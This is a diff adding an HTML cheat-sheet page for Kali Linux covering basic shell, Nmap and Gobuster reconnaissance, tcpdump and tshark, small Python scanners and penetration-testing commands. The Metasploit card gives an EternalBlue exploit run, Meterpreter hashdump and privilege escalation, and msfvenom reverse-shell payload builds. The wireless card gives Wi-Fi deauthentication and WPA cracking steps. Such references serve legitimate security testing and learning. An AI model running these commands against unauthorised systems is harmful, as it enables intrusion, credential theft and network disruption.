@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux & Security Engineering Master Handbook</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --panel-bg: #161b22;
+            --border-color: #30363d;
+            --accent-color: #238636;
+            --text-main: #c9d1d9;
+            --text-header: #58a6ff;
+            --code-bg: #010409;
+            --btn-active: #1f6feb;
+            --btn-bg: #21262d;
+            --btn-hover: #30363d;
+            --copy-btn-bg: #21262d;
+            --copy-btn-success: #238636;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .header-title h1 {
+            color: var(--text-header);
+            font-size: 1.8rem;
+            margin-bottom: 4px;
+        }
+
+        .subtitle {
+            font-size: 0.95rem;
+            color: #8b949e;
+        }
+
+        .export-btn {
+            background-color: var(--accent-color);
+            color: #ffffff;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+
+        .export-btn:hover {
+            background-color: #2ea043;
+        }
+
+        /* TAB CONTROLS */
+        .tabs-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .tab-btn {
+            background-color: var(--btn-bg);
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .tab-btn:hover {
+            background-color: var(--btn-hover);
+            border-color: #8b949e;
+        }
+
+        .tab-btn.active {
+            background-color: var(--btn-active);
+            color: #ffffff;
+            border-color: var(--btn-active);
+        }
+
+        /* SEARCH BAR */
+        .search-container {
+            margin-bottom: 20px;
+        }
+
+        #searchInput {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-main);
+            font-size: 1rem;
+            outline: none;
+        }
+
+        #searchInput:focus {
+            border-color: var(--text-header);
+        }
+
+        /* GRID & CARDS */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 18px;
+        }
+
+        .card h2 {
+            color: var(--text-header);
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 6px;
+        }
+
+        .cmd-group {
+            margin-bottom: 14px;
+        }
+
+        .cmd-title {
+            font-weight: bold;
+            font-size: 0.9rem;
+            color: #f0f6fc;
+            margin-bottom: 4px;
+        }
+
+        .cmd-desc {
+            font-size: 0.85rem;
+            color: #8b949e;
+            margin-bottom: 6px;
+        }
+
+        .code-block-wrapper {
+            position: relative;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            padding-right: 70px;
+            overflow-x: auto;
+            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+            font-size: 0.85rem;
+            color: #e6edf3;
+        }
+
+        code {
+            font-family: inherit;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            background-color: var(--copy-btn-bg);
+            color: #c9d1d9;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background-color: var(--btn-hover);
+            color: #ffffff;
+        }
+
+        .copy-btn.copied {
+            background-color: var(--copy-btn-success);
+            color: #ffffff;
+            border-color: var(--copy-btn-success);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-title">
+            <h1>Kali Linux & Security Engineering Handbook</h1>
+            <div class="subtitle">Quick reference guide for CLI commands, Metasploit Framework, Python scripting, and Network Analysis.</div>
+        </div>
+        <button class="export-btn" onclick="exportCheatsheet()">
+            <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/>
+                <path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/>
+            </svg>
+            Export Cheatsheet (.txt)
+        </button>
+    </header>
+
+    <!-- CATEGORY TABS -->
+    <div class="tabs-container">
+        <button class="tab-btn active" onclick="filterCategory('all', this)">All Categories</button>
+        <button class="tab-btn" onclick="filterCategory('linux', this)">Linux Basics</button>
+        <button class="tab-btn" onclick="filterCategory('recon', this)">Recon & Network</button>
+        <button class="tab-btn" onclick="filterCategory('metasploit', this)">Metasploit</button>
+        <button class="tab-btn" onclick="filterCategory('wireless', this)">Wireless Auditing</button>
+        <button class="tab-btn" onclick="filterCategory('python', this)">Python Utilities</button>
+    </div>
+
+    <!-- SEARCH BAR -->
+    <div class="search-container">
+        <input type="text" id="searchInput" placeholder="Search commands, flags, tools, or concepts within active category..." onkeyup="applyFilters()">
+    </div>
+
+    <div class="grid-container" id="handbookGrid">
+
+        <!-- KALI SYSTEM COMMANDS -->
+        <div class="card" data-category="linux">
+            <h2>Essential Linux Navigation & Management</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">Navigation & Working Directory</div>
+                <div class="cmd-desc">Check directory, list hidden contents, and change path.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>pwd
+ls -la
+cd /path/to/directory
+cd ..</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">File Operations</div>
+                <div class="cmd-desc">Create, copy, move, and remove files or directories.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>mkdir new_folder
+touch file.txt
+cp source.txt dest.txt
+mv file.txt /new/path/
+rm file.txt
+rm -rf directory/</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">Permissions & Ownership</div>
+                <div class="cmd-desc">Make scripts executable and modify file owners.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>chmod +x script.sh
+chmod 600 private.key
+chown user:group file.txt</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">System & Process Monitoring</div>
+                <div class="cmd-desc">Check processes, memory, and kernel details.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>uname -a
+whoami
+id
+ps aux
+kill -9 &lt;PID&gt;
+df -h
+free -m</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- RECONNAISSANCE & NETWORKING -->
+        <div class="card" data-category="recon">
+            <h2>Networking & Reconnaissance</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">Interface & IP Management</div>
+                <div class="cmd-desc">Inspect network interfaces and active sockets.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>ip a
+ifconfig
+netstat -tulnp
+ss -tulnp</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">Network Discovery & Port Scanning</div>
+                <div class="cmd-desc">Scan target hosts for open ports and services using Nmap.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>nmap -sV -sC -O -p- &lt;target_ip&gt;
+netdiscover -r 192.168.1.0/24</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">DNS & Web Enumeration</div>
+                <div class="cmd-desc">Gather DNS records and brute-force web directories.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>dig &lt;domain&gt; ANY
+nslookup &lt;domain&gt;
+gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- METASPLOIT FRAMEWORK -->
+        <div class="card" data-category="metasploit">
+            <h2>Metasploit Framework (MSF)</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">Core Operating Workflow</div>
+                <div class="cmd-desc">Initialize msfconsole, search modules, and assign target variables.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS &lt;target_ip&gt;
+set LHOST &lt;your_ip&gt;
+exploit</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">Meterpreter Operations</div>
+                <div class="cmd-desc">Commands executed within an active Meterpreter shell session.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>sysinfo
+getuid
+getsystem
+hashdump
+shell
+background</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">MSFvenom Staged Payload Generation</div>
+                <div class="cmd-desc">Generate standalone executable reverse shell payloads.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f elf -o shell.elf</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- WIRELESS AUDITING -->
+        <div class="card" data-category="wireless">
+            <h2>Wireless & 802.11 Auditing</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">Aircrack-ng Suite Operations</div>
+                <div class="cmd-desc">Enable monitor mode, capture handshakes, and deauthenticate clients.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng --bssid &lt;BSSID&gt; -c &lt;CHANNEL&gt; -w cap wlan0mon
+sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; -c &lt;CLIENT_MAC&gt; wlan0mon
+aircrack-ng -w wordlist.txt -b &lt;BSSID&gt; cap-01.cap</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">Automated Auditing with Wifite</div>
+                <div class="cmd-desc">Run automated wireless auditing against target channels.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>sudo wifite -c 1,6,11
+sudo wifite --wpa --dict /path/to/wordlist.txt</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PACKET ANALYSIS -->
+        <div class="card" data-category="recon">
+            <h2>Packet Analysis (Tcpdump & Tshark)</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">Tcpdump Packet Capture</div>
+                <div class="cmd-desc">Filter traffic using Berkeley Packet Filters (BPF).</div>
+                <div class="code-block-wrapper">
+                    <pre><code>tcpdump -i eth0 -n -vv
+tcpdump -i eth0 -w output.pcap
+tcpdump host 192.168.1.50 and port 80
+tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">Tshark CLI Extraction</div>
+                <div class="cmd-desc">Extract protocol fields directly from PCAP files.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
+tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PYTHON UTILITIES -->
+        <div class="card" data-category="python">
+            <h2>Security Automation Scripts (Python)</h2>
+            
+            <div class="cmd-group">
+                <div class="cmd-title">TCP Port Scanner</div>
+                <div class="cmd-desc">Standard socket-based TCP scanner snippet.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>import socket
+
+target = "127.0.0.1"
+ports = [22, 80, 443]
+
+for port in ports:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1.0)
+    if s.connect_ex((target, port)) == 0:
+        print(f"[+] Port {port} OPEN")
+    s.close()</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="cmd-group">
+                <div class="cmd-title">HTTP Directory Checker</div>
+                <div class="cmd-desc">Basic web path check script using Requests.</div>
+                <div class="code-block-wrapper">
+                    <pre><code>import requests
+
+url = "http://127.0.0.1"
+paths = ["admin", "login", "uploads"]
+
+for path in paths:
+    res = requests.get(f"{url}/{path}")
+    if res.status_code == 200:
+        print(f"[+] Found: {url}/{path}")</code></pre>
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentCategory = 'all';
+
+        function filterCategory(category, element) {
+            currentCategory = category;
+
+            // Update active tab button style
+            const buttons = document.querySelectorAll('.tab-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+
+            // Apply filters combined with search input
+            applyFilters();
+        }
+
+        function applyFilters() {
+            const searchInput = document.getElementById('searchInput').value.toLowerCase();
+            const cards = document.querySelectorAll('.card');
+
+            cards.forEach(card => {
+                const cardCategory = card.getAttribute('data-category');
+                const cardText = card.textContent.toLowerCase();
+
+                const matchesCategory = (currentCategory === 'all' || cardCategory === currentCategory);
+                const matchesSearch = cardText.includes(searchInput);
+
+                if (matchesCategory && matchesSearch) {
+                    card.classList.remove('hidden');
+                } else {
+                    card.classList.add('hidden');
+                }
+            });
+        }
+
+        // ONE-CLICK COPY FUNCTIONALITY
+        function copyCode(button) {
+            const wrapper = button.parentElement;
+            const codeBlock = wrapper.querySelector('code');
+            const textToCopy = codeBlock.innerText;
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                button.textContent = 'Copied!';
+                button.classList.add('copied');
+                setTimeout(() => {
+                    button.textContent = 'Copy';
+                    button.classList.remove('copied');
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        // EXPORT CHEATSHEET FUNCTIONALITY
+        function exportCheatsheet() {
+            const visibleCards = document.querySelectorAll('.card:not(.hidden)');
+            let exportContent = "====================================================\n";
+            exportContent += " KALI LINUX & SECURITY ENGINEERING CHEATSHEET EXPORT\n";
+            exportContent += "====================================================\n\n";
+
+            visibleCards.forEach(card => {
+                const cardTitle = card.querySelector('h2').innerText;
+                exportContent += `[ ${cardTitle.toUpperCase()} ]\n`;
+                exportContent += "----------------------------------------------------\n";
+
+                const cmdGroups = card.querySelectorAll('.cmd-group');
+                cmdGroups.forEach(group => {
+                    const title = group.querySelector('.cmd-title').innerText;
+                    const desc = group.querySelector('.cmd-desc').innerText;
+                    const code = group.querySelector('code').innerText;
+
+                    exportContent += `* ${title}\n  Description: ${desc}\n  Commands:\n`;
+                    code.split('\n').forEach(line => {
+                        exportContent += `    ${line}\n`;
+                    });
+                    exportContent += "\n";
+                });
+                exportContent += "\n";
+            });
+
+            const blob = new Blob([exportContent], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'kali_security_cheatsheet.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+        }
+    </script>
+</body>
+</html>
